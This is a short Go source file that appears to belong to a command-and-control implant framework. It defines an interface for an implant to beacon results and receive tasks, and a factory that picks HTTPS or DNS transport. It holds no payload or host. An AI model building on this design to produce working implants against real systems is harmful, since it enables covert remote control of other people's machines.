package c2communicator

import "fmt"

type C2Communicator interface {
	Beacon(implantID uint, results []Result) (*TaskQueue, error)
}

// NewC2Communicator picks the right implementation based on protocol.
func NewC2Communicator(protocol string) (C2Communicator, error) {
	switch protocol {
	case "HTTPS":
		return NewHTTPSC2Communicator(), nil
	case "DNS":
		return NewDNSC2Communicator(), nil
	default:
		return nil, fmt.Errorf("unsupported C2 protocol %q", protocol)
	}
}
